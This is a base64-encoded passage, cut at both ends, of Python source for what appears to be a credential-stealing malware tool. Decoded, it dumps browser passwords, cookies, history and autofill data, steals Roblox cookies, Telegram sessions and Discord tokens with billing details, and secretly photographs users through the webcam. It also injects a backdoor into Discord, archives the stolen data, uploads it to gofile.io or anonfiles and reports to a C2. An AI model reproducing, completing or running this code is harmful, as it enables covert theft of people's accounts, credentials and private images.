KyBzZWxmLlNlcGFyYXRvci5qb2luKG91dHB1dCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuUGFzc3dvcmRzQ291bnQgKz0gbGVuKHBhc3N3b3JkcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjb29raWVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBbJ3t9XHR7fVx0e31cdHt9XHR7fVx0e31cdHt9Jy5mb3JtYXQoaG9zdCwgc3RyKGV4cGlyeSAhPSAwKS51cHBlcigpLCBjcGF0aCwgc3RyKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm90IGhvc3Quc3RhcnRzd2l0aCgnLicpKS51cHBlcigpLCBleHBpcnksIGNuYW1lLCBjb29raWUpIGZvciBob3N0LCBjbmFtZSwgY3BhdGgsIGNvb2tpZSwgZXhwaXJ5IGluIGNvb2tpZXNdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvRGlyLCAne30gQ29va2llcy50eHQnLmZvcm1hdChuYW1lKSksICd3JywgZXJyb3JzPSdpZ25vcmUnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZSgnXG4nLmpvaW4ob3V0cHV0KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5Db29raWVzLmV4dGVuZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtzdHIoeFszXSkgZm9yIHggaW4gY29va2llc10pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGlzdG9yeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gWydVUkw6IHt9XG5UaXRsZToge31cblZpc2l0czoge30nLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICp4KSBmb3IgeCBpbiBoaXN0b3J5XQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNhdmVUb0RpciwgJ3t9IEhpc3RvcnkudHh0Jy5mb3JtYXQobmFtZSkpLCAndycsIGVycm9ycz0naWdub3JlJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoc2VsZi5TZXBhcmF0b3IubHN0cmlwKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSArIHNlbGYuU2VwYXJhdG9yLmpvaW4ob3V0cHV0KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5IaXN0b3J5Q291bnQgKz0gbGVuKGhpc3RvcnkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYXV0b2ZpbGxzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSAnXG4nLmpvaW4oYXV0b2ZpbGxzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNhdmVUb0RpciwgJ3t9IEF1dG9maWxscy50eHQnLmZvcm1hdChuYW1lKSksICd3JywgZXJyb3JzPSdpZ25vcmUnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShvdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuQXV0b2ZpbGxDb3VudCArPSBsZW4oYXV0b2ZpbGxzKQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgIHQgPSBUaHJlYWQodGFyZ2V0PXJ1biwgYXJncz0obmFtZSwgcGF0aCkpCiAgICAgICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICAgICAgdGhyZWFkcy5hcHBlbmQodCkKICAgICAgICAgICAgZm9yIHRocmVhZCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlR2FtZXM6CiAgICAgICAgICAgICAgICBzZWxmLlN0ZWFsUm9ibG94Q29va2llcygpCgogICAgICAgIEBFcnJvcnMuQ2F0Y2gKICAgICAgICBkZWYgV2Vic2hvdChzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlV2ViY2FtOgogICAgICAgICAgICAgICAgY2FtZGlyID0gb3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwgJ1dlYmNhbScpCiAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhjYW1kaXIsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICBjYW1JbmRleCA9IDAKICAgICAgICAgICAgICAgIHdoaWxlIFN5c2NhbGxzLkNhcHR1cmVXZWJjYW0oY2FtSW5kZXgsIG9zLnBhdGguam9pbihjYW1kaXIsICdXZWJjYW0gKCVkKS5ibXAnICUgKGNhbUluZGV4ICsgMSkpKToKICAgICAgICAgICAgICAgICAgICBjYW1JbmRleCArPSAxCiAgICAgICAgICAgICAgICAgICAgc2VsZi5XZWJjYW1QaWN0dXJlc0NvdW50ICs9IDEKICAgICAgICAgICAgICAgIGlmIHNlbGYuV2ViY2FtUGljdHVyZXNDb3VudCA9PSAwOgogICAgICAgICAgICAgICAgICAgIHNodXRpbC5ybXRyZWUoY2FtZGlyKQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsVGVsZWdyYW1TZXNzaW9ucyhzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlVGVsZWdyYW06CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnU3RlYWxpbmcgdGVsZWdyYW0gc2Vzc2lvbnMnKQogICAgICAgICAgICAgICAgdGVsZWdyYW1QYXRocyA9IFsqc2V0KFtvcy5wYXRoLmRpcm5hbWUoeCkgZm9yIHggaW4gW1V0aWxpdHkuR2V0TG5rVGFyZ2V0KHYpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHYgaW4gVXRpbGl0eS5HZXRMbmtGcm9tU3RhcnRNZW51KCdUZWxlZ3JhbScpXSBpZiB4IGlzIG5vdCBOb25lXSldCiAgICAgICAgICAgICAgICBtdWx0aXBsZSA9IGxlbih0ZWxlZ3JhbVBhdGhzKSA+IDEKICAgICAgICAgICAgICAgIHNhdmVUb0RpciA9IG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICBzZWxmLlRlbXBGb2xkZXIsICdNZXNzZW5nZXInLCAnVGVsZWdyYW0nKQogICAgICAgICAgICAgICAgaWYgbm90IHRlbGVncmFtUGF0aHM6CiAgICAgICAgICAgICAgICAgICAgdGVsZWdyYW1QYXRocy5hcHBlbmQob3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICBvcy5nZXRlbnYoJ2FwcGRhdGEnKSwgJ1RlbGVncmFtIERlc2t0b3AnKSkKICAgICAgICAgICAgICAgIGZvciBpbmRleCwgdGVsZWdyYW1QYXRoIGluIGVudW1lcmF0ZSh0ZWxlZ3JhbVBhdGhzKToKICAgICAgICAgICAgICAgICAgICB0RGF0YVBhdGggPSBvcy5wYXRoLmpvaW4odGVsZWdyYW1QYXRoLCAndGRhdGEnKQogICAgICAgICAgICAgICAgICAgIGxvZ2luUGF0aHMgPSBbXQogICAgICAgICAgICAgICAgICAgIGZpbGVzID0gW10KICAgICAgICAgICAgICAgICAgICBkaXJzID0gW10KICAgICAgICAgICAgICAgICAgICBoYXNfa2V5X2RhdGFzID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHREYXRhUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpdGVtIGluIG9zLmxpc3RkaXIodERhdGFQYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1wYXRoID0gb3MucGF0aC5qb2luKHREYXRhUGF0aCwgaXRlbSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGl0ZW0gPT0gJ2tleV9kYXRhcyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGFzX2tleV9kYXRhcyA9IFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dpblBhdGhzLmFwcGVuZChpdGVtcGF0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGl0ZW1wYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlcy5hcHBlbmQoaXRlbSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlycy5hcHBlbmQoaXRlbSkKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGVuYW1lIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGRpcm5hbWUgaW4gZGlyczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXJuYW1lICsgJ3MnID09IGZpbGVuYW1lOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dpblBhdGhzLmV4dGVuZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtvcy5wYXRoLmpvaW4odERhdGFQYXRoLCB4KSBmb3IgeCBpbiAoZmlsZW5hbWUsIGRpcm5hbWUpXSkKICAgICAgICAgICAgICAgICAgICBpZiBoYXNfa2V5X2RhdGFzIGFuZCBsZW4obG9naW5QYXRocykgLSAxID4gMDoKICAgICAgICAgICAgICAgICAgICAgICAgX3NhdmVUb0RpciA9IHNhdmVUb0RpcgogICAgICAgICAgICAgICAgICAgICAgICBpZiBtdWx0aXBsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9zYXZlVG9EaXIgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX3NhdmVUb0RpciwgJ1Byb2ZpbGUgJWQnICUgKGluZGV4ICsgMSkpCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLm1ha2VkaXJzKF9zYXZlVG9EaXIsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGZhaWxlZCA9IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBsb2dpblBhdGggaW4gbG9naW5QYXRoczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShsb2dpblBhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weShsb2dpblBhdGgsIG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9zYXZlVG9EaXIsIG9zLnBhdGguYmFzZW5hbWUobG9naW5QYXRoKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHl0cmVlKGxvZ2luUGF0aCwgb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX3NhdmVUb0Rpciwgb3MucGF0aC5iYXNlbmFtZShsb2dpblBhdGgpKSwgZGlyc19leGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwucm10cmVlKF9zYXZlVG9EaXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmFpbGVkID0gVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBmYWlsZWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLlRlbGVncmFtU2Vzc2lvbnNDb3VudCArPSBpbnQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKGxlbihsb2dpblBhdGhzKSAtIDEpIC8gMikKICAgICAgICAgICAgICAgIGlmIHNlbGYuVGVsZWdyYW1TZXNzaW9uc0NvdW50IGFuZCBtdWx0aXBsZToKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNhdmVUb0RpciwgJ0luZm8udHh0JyksICd3JykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdNdWx0aXBsZSBUZWxlZ3JhbSBpbnN0YWxsYXRpb25zIGFyZSBmb3VuZCwgc28gdGhlIGZpbGVzIGZvciBlYWNoIG9mIHRoZW0gYXJlIHB1dCBpbiBkaWZmZXJlbnQgUHJvZmlsZXMnKQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsRGlzY29yZFRva2VucyhzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlRGlzY29yZFRva2VuczoKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdTdGVhbGluZyBkaXNjb3JkIHRva2VucycpCiAgICAgICAgICAgICAgICBvdXRwdXQgPSBsaXN0KCkKICAgICAgICAgICAgICAgIHNhdmVUb0RpciA9IG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICBzZWxmLlRlbXBGb2xkZXIsICdNZXNzZW5nZXInLCAnRGlzY29yZCcpCiAgICAgICAgICAgICAgICBhY2NvdW50cyA9IERpc2NvcmQuR2V0VG9rZW5zKCkKICAgICAgICAgICAgICAgIGlmIGFjY291bnRzOgogICAgICAgICAgICAgICAgICAgIGZvciBpdGVtIGluIGFjY291bnRzOgogICAgICAgICAgICAgICAgICAgICAgICBVU0VSTkFNRSwgVVNFUklELCBNRkEsIEVNQUlMLCBQSE9ORSwgVkVSSUZJRUQsIE5JVFJPLCBCSUxMSU5HLCBUT0tFTiwgR0lGVFMgPSBpdGVtLnZhbHVlcygpCiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dC5hcHBlbmQoJ1VzZXJuYW1lOiB7fVxuVXNlciBJRDoge31cbk1GQSBlbmFibGVkOiB7fVxuRW1haWw6IHt9XG5QaG9uZToge31cblZlcmlmaWVkOiB7fVxuTml0cm86IHt9XG5CaWxsaW5nIE1ldGhvZChzKToge31cblxuVG9rZW46IHt9XG5cbnt9Jy5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVU0VSTkFNRSwgVVNFUklELCAnWWVzJyBpZiBNRkEgZWxzZSAnTm8nLCBFTUFJTCwgUEhPTkUsICdZZXMnIGlmIFZFUklGSUVEIGVsc2UgJ05vJywgTklUUk8sIEJJTExJTkcsIFRPS0VOLCBHSUZUUykuc3RyaXAoKSkKICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhvcy5wYXRoLmpvaW4oc2VsZi5UZW1wRm9sZGVyLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdNZXNzZW5nZXInLCAnRGlzY29yZCcpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvRGlyLCAnRGlzY29yZCBUb2tlbnMudHh0JyksICd3JywgZW5jb2Rpbmc9J3V0Zi04JywgZXJyb3JzPSdpZ25vcmUnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKHNlbGYuU2VwYXJhdG9yLmxzdHJpcCgpICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLlNlcGFyYXRvci5qb2luKG91dHB1dCkpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5EaXNjb3JkVG9rZW5zQ291bnQgKz0gbGVuKGFjY291bnRzKQogICAgICAgICAgICBpZiBTZXR0aW5ncy5EaXNjb3JkSW5qZWN0aW9uIGFuZCAobm90IFV0aWxpdHkuSXNJblN0YXJ0dXAoKSk6CiAgICAgICAgICAgICAgICBwYXRocyA9IERpc2NvcmQuSW5qZWN0SnMoKQogICAgICAgICAgICAgICAgaWYgcGF0aHMgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ0luamVjdGluZyBiYWNrZG9vciBpbnRvIGRpc2NvcmQnKQogICAgICAgICAgICAgICAgICAgIGZvciBkaXIgaW4gcGF0aHM6CiAgICAgICAgICAgICAgICAgICAgICAgIGFwcG5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKGRpcikKICAgICAgICAgICAgICAgICAgICAgICAgVXRpbGl0eS5UYXNrS2lsbChhcHBuYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBmb3Igcm9vdCwgXywgZmlsZXMgaW4gb3Mud2FsayhkaXIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsZS5sb3dlcigpID09IGFwcG5hbWUubG93ZXIoKSArICcuZXhlJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlcGF0aCA9IG9zLnBhdGguZGlybmFtZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnBhdGgucmVhbHBhdGgob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXBkYXRlRVhFID0gb3MucGF0aC5qb2luKGRpciwgJ1VwZGF0ZS5leGUnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXNjb3JkRVhFID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXBhdGgsICd7fS5leGUnLmZvcm1hdChhcHBuYW1lKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihbVXBkYXRlRVhFLCAnLS1wcm9jZXNzU3RhcnQnLCBEaXNjb3JkRVhFXSwgc2hlbGw9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05FV19DT05TT0xFIHwgc3VicHJvY2Vzcy5TV19ISURFKQoKICAgICAgICBkZWYgQ3JlYXRlQXJjaGl2ZShzZWxmKSAtPiB0dXBsZVtzdHIsIHN0cl06CiAgICAgICAgICAgIExvZ2dlci5pbmZvKCdDcmVhdGluZyBhcmNoaXZlJykKICAgICAgICAgICAgcmFyUGF0aCA9IG9zLnBhdGguam9pbihzeXMuX01FSVBBU1MsICdyYXIuZXhlJykKICAgICAgICAgICAgaWYgVXRpbGl0eS5HZXRTZWxmKClbMV0gb3Igb3MucGF0aC5pc2ZpbGUocmFyUGF0aCk6CiAgICAgICAgICAgICAgICByYXJQYXRoID0gb3MucGF0aC5qb2luKHN5cy5fTUVJUEFTUywgJ3Jhci5leGUnKQogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocmFyUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBTZXR0aW5ncy5BcmNoaXZlUGFzc3dvcmQgb3IgJ2JsYW5rMTIzJwogICAgICAgICAgICAgICAgICAgIHByb2Nlc3MgPSBzdWJwcm9jZXNzLnJ1bigne30gYSAtciAtaHAie30iICJ7fSIgKicuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICByYXJQYXRoLCBwYXNzd29yZCwgc2VsZi5BcmNoaXZlUGF0aCksIGNhcHR1cmVfb3V0cHV0PVRydWUsIHNoZWxsPVRydWUsIGN3ZD1zZWxmLlRlbXBGb2xkZXIpCiAgICAgICAgICAgICAgICAgICAgaWYgcHJvY2Vzcy5yZXR1cm5jb2RlID09IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAncmFyJwogICAgICAgICAgICBzaHV0aWwubWFrZV9hcmNoaXZlKHNlbGYuQXJjaGl2ZVBhdGgucnNwbGl0KCcuJywgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMF0sICd6aXAnLCBzZWxmLlRlbXBGb2xkZXIpCiAgICAgICAgICAgIHJldHVybiAnemlwJwoKICAgICAgICBkZWYgVXBsb2FkVG9FeHRlcm5hbFNlcnZpY2Uoc2VsZiwgcGF0aCwgZmlsZW5hbWU9Tm9uZSkgLT4gc3RyIHwgTm9uZToKICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCk6CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnVXBsb2FkaW5nICVzIHRvIGdvZmlsZScgJSAoZmlsZW5hbWUgb3IgJ2ZpbGUnKSkKICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAncmInKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZpbGVCeXRlcyA9IGZpbGUucmVhZCgpCiAgICAgICAgICAgICAgICBpZiBmaWxlbmFtZSBpcyBOb25lOgogICAgICAgICAgICAgICAgICAgIGZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShwYXRoKQogICAgICAgICAgICAgICAgaHR0cCA9IFBvb2xNYW5hZ2VyKGNlcnRfcmVxcz0nQ0VSVF9OT05FJykKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBzZXJ2ZXIgPSBqc29uLmxvYWRzKGh0dHAucmVxdWVzdCgKICAgICAgICAgICAgICAgICAgICAgICAgJ0dFVCcsICdodHRwczovL2FwaS5nb2ZpbGUuaW8vZ2V0U2VydmVyJykuZGF0YS5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKSlbJ2RhdGEnXVsnc2VydmVyJ10KICAgICAgICAgICAgICAgICAgICBpZiBzZXJ2ZXI6CiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IGpzb24ubG9hZHMoaHR0cC5yZXF1ZXN0KCdQT1NUJywgJ2h0dHBzOi8ve30uZ29maWxlLmlvL3VwbG9hZEZpbGUnLmZvcm1hdChzZXJ2ZXIpLCBmaWVsZHM9ewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGUnOiAoZmlsZW5hbWUsIGZpbGVCeXRlcyl9KS5kYXRhLmRlY29kZShlcnJvcnM9J2lnbm9yZScpKVsnZGF0YSddWydkb3dubG9hZFBhZ2UnXQogICAgICAgICAgICAgICAgICAgICAgICBpZiB1cmw6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdXJsCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgTG9nZ2VyLmVycm9yKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0ZhaWxlZCB0byB1cGxvYWQgdG8gZ29maWxlLCB0cnlpbmcgdG8gdXBsb2FkIHRvIGFub25maWxlcycpCiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IGpzb24ubG9hZHMoaHR0cC5yZXF1ZXN0KCdQT1NUJywgJ2h0dHBzOi8vYXBpLmFub25maWxlcy5jb20vdXBsb2FkJywgZmllbGRzPXsnZmlsZSc6ICgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVuYW1lLCBmaWxlQnl0ZXMpfSkuZGF0YS5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKSlbJ2RhdGEnXVsnZmlsZSddWyd1cmwnXVsnc2hvcnQnXQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdXJsCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgTG9nZ2VyLmVycm9yKCdGYWlsZWQgdG8gdXBsb2FkIHRvIGFub25maWxlcycpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBOb25lCgogICAgICAgIGRlZiBTZW5kRGF0YShzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBMb2dnZXIuaW5mbygnU2VuZGluZyBkYXRhIHRvIEMyJykKICAgICAgICAgICAgZXh0ZW50aW9uID0gc2VsZi5DcmVhdGVBcmNoaXZlKCkKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHNlbGYuQXJjaGl2ZVBhdGgpOgogICAgICAgICAgICAgICAgcmFpc2UgRmlsZU5vdEZvdW5kRXJyb3IoJ0ZhaWxlZCB0byBjcmVhdGUgYXJjaGl2ZScpCiAgICAgICAgICAgIGZpbGVuYW1lID0gJ0JsYW5rLSVzLiVzJyAlIChvcy5nZXRsb2dpbigpLCBleHRlbnRpb24pCiAgICAgICAgICAgIGNvbXB1dGVyTmFtZSA9IG9zLmdldGVudigKICAgICAgICAgICAgICAgICdjb21wdXRlcm5hbWUnKSBvciAnVW5hYmxlIHRvIGdldCBjb21wdXRlciBuYW1lJwogICAgICAgICAgICBjb21wdXRlck9TID0gc3VicHJvY2Vzcy5ydW4oJ3dtaWMgb3MgZ2V0IENhcHRpb24nLCBjYXB0dXJlX291dHB1dD1UcnVlLCBzaGVsbD1UcnVlKS5zdGRvdXQuZGVjb2RlKAogICAgICAgICAgICAgICAgZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpLnNwbGl0bGluZXMoKQogICAgICAgICAgICBjb21wdXRlck9TID0gY29tcHV0ZXJPU1syXS5zdHJpcCgpIGlmIGxlbigKICAgICAgICAgICAgICAgIGNvbXB1dGVyT1MpID49IDIgZWxzZSAnVW5hYmxlIHRvIGRldGVjdCBPUycKICAgICAgICAgICAgdG90YWxNZW1vcnkgPSBzdWJwcm9jZXNzLnJ1bignd21pYyBjb21wdXRlcnN5c3RlbSBnZXQgdG90YWxwaHlzaWNhbG1lbW9yeScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkuc3Rkb3V0LmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkuc3BsaXQoKQogICAgICAgICAgICB0b3RhbE1lbW9yeSA9IHN0cihpbnQoaW50KHRvdGFsTWVtb3J5WzFdKSAvIDEwMDAwMDAwMDApKSArICcgR0InIGlmIGxlbigKICAgICAgICAgICAgICAgIHRvdGFsTWVtb3J5KSA+PSAxIGVsc2UgJ1VuYWJsZSB0byBkZXRlY3QgdG90YWwgbWVtb3J5JwogICAgICAgICAgICB1dWlkID0gc3VicHJvY2Vzcy5ydW4oJ3dtaWMgY3Nwcm9kdWN0IGdldCB1dWlkJywgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNoZWxsPVRydWUpLnN0ZG91dC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpLnNwbGl0KCkKICAgICAgICAgICAgdXVpZCA9IHV1aWRbMV0uc3RyaXAoKSBpZiBsZW4oCiAgICAgICAgICAgICAgICB1dWlkKSA+PSAxIGVsc2UgJ1VuYWJsZSB0byBkZXRlY3QgVVVJRCcKICAgICAgICAgICAgY3B1ID0gc3VicHJvY2Vzcy5ydW4oInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoICdIS0xNOlN5c3RlbVxcQ3VycmVudENvbnRyb2xTZXRcXENvbnRyb2xcXFNlc3Npb24gTWFuYWdlclxcRW52aXJvbm1lbnQnIC1OYW1lIFBST0NFU1NPUl9JREVOVElGSUVSIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkuc3Rkb3V0LmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkgb3IgJ1VuYWJsZSB0byBkZXRlY3QgQ1BVJwogICAgICAgICAgICBncHUgPSBzdWJwcm9jZXNzLnJ1bignd21pYyBwYXRoIHdpbjMyX1ZpZGVvQ29udHJvbGxlciBnZXQgbmFtZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsIHNoZWxsPVRydWUpLnN0ZG91dC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zcGxpdGxpbmVzKCkKICAgICAgICAgICAgZ3B1ID0gZ3B1WzJdLnN0cmlwKCkgaW